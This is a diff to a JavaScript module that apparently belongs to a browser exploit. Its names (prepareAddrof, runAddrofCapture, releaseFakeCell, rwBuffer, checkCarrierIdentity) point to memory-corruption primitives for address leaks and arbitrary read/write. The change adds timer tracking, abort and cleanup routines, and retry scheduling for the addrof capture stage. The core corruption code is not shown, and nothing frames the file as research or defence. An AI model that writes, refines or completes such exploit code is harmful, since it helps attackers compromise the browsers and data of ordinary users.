@@ -85,6 +85,7 @@ let criticalBarrier = null;
 let settleResolve = null;
 let settleReject = null;
 let running = false;
+const scheduledTimers = [];
 
 let referenceTarget = null;
 let rwBuffer = null;
@@ -292,6 +293,23 @@ function emit(tag, detail) {
     catch {  }
 }
 
+function scheduleTimer(callback, delay) {
+    const timerId = setTimeout(() => {
+        const index = scheduledTimers.indexOf(timerId);
+        if (index >= 0)
+            scheduledTimers.splice(index, 1);
+        callback();
+    }, delay);
+    scheduledTimers.push(timerId);
+    return timerId;
+}
+
+function clearScheduledTimers() {
+    while (scheduledTimers.length) {
+        clearTimeout(scheduledTimers.pop());
+    }
+}
+
 function checkCarrierIdentity(candidate) {
     if (!plausibleAddress(rwOriginalVector) || rwOriginalVector % 8 !== 0
         || IDENT_OFFSET + 8 > RW_BUFFER_SIZE)
@@ -332,7 +350,7 @@ function failed() {
     emit("AUTO-RETRY-AFTER-FAILURE", `attempt=${attemptNumber}`);
     stopped = false;
     retryScheduled = false;
-    setTimeout(() => {
+    scheduleTimer(() => {
         try { history.replaceState(null, ""); } catch { }
         attemptNumber++;
         startAttempt();
@@ -396,7 +414,7 @@ function scheduleSafeRetry(reason) {
     const nextAttempt = attemptNumber + 1;
     emit("AUTO-RETRY-SCHEDULED", `reason=${reason}-next-attempt=${nextAttempt}`);
     releaseAttemptAllocations();
-    setTimeout(() => {
+    scheduleTimer(() => {
         const candidateStillSafe = !candidateEverReturned
             || (zeroHeaderMiss && !candidateMutationStarted);
         if (!retrySafe || !candidateStillSafe
@@ -633,8 +651,8 @@ function prepareAddrof() {
     preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
     emit("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);
 
-    setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
-    setTimeout(beginComposition, COMPOSE_DELAY_MS);
+    scheduleTimer(runAddrofCapture, CAPTURE_DELAY_MS);
+    scheduleTimer(beginComposition, COMPOSE_DELAY_MS);
 }
 
 function runAddrofCapture() {
@@ -1321,7 +1339,44 @@ export function releaseFakeCell() {
     running = false;
 
     retryScheduled = false;
+    clearScheduledTimers();
     return report;
+}
+
+export function cleanupTemporaryAllocations() {
+    stopped = true;
+    running = false;
+    retryScheduled = false;
+    clearScheduledTimers();
+    releaseAttemptAllocations();
+    liveCandidate = null;
+    try { history.replaceState(null, ""); } catch (_) { }
+    return {
+        cleaned: true,
+        releasedFakeCell: fakeReleased
+    };
+}
+
+export function abortPrimitive() {
+    const hadPendingWork = running || scheduledTimers.length > 0 || retryScheduled;
+    stopped = true;
+    running = false;
+    retryScheduled = false;
+    clearScheduledTimers();
+    releaseAttemptAllocations();
+    liveCandidate = null;
+    try { history.replaceState(null, ""); } catch (_) { }
+    const reject = settleReject;
+    settleResolve = null;
+    settleReject = null;
+    if (reject !== null) {
+        reject(new Error("core: aborted"));
+    }
+    return {
+        aborted: true,
+        hadPendingWork,
+        releasedFakeCell: fakeReleased
+    };
 }
 
 export function fakeCellReleased() {
